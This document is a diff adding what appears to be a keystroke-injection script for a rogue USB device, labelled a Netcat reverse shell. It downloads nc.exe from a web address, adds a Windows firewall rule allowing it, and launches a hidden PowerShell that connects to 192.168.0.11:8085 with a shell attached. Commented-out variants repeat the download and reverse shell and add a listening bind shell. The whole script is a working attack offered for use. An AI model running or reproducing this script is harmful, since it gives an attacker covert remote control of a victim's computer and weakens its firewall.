@@ -1,0 +1,31 @@
+::OS Windows
+::REM Netcat reverse shell
+::TERM
+$temp = $env:TEMP
+$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\StartUp"
+cd $temp
+
+TASKKILL /im nc.exe /f
+erase nc.exe
+Invoke-WebRequest 'https://www.cse.unsw.edu.au/~z3419746/nc.exe' -OutFile 'nc.exe'
+netsh advfirewall firewall add rule name='Netcat' dir=in action=allow program="$temp\nc.exe" enable=yes
+::DELAY 2000
+start-process powershell -windowstyle hidden "$env:TEMP\nc.exe 192.168.0.11 8085 -e powershell"
+exit
+
+
+::REM ::OS Windows
+::REM ::TERM
+::REM ::REM $desktop = [Environment]::GetFolderPath('desktop')
+::REM ::REM cd $desktop
+::REM cd $env:TEMP
+::REM wget 'https://www.cse.unsw.edu.au/~z3419746/nc.exe' -OutFile nc.exe
+::REM ::DELAY 4000
+::REM start-process nc.exe '192.168.0.11 8085 -e powershell.exe -d'; exit
+::REM start-process nc.exe '-lp 8085 -e powershell.exe -d'; exit
+
+
+::REM ::OS Windows
+::REM ::RUN cmd
+::REM cd %userprofile%\desktop
+::REM START /MIN nc_win.exe 192.168.0.11 8085 -e powershell.exe -d & exit
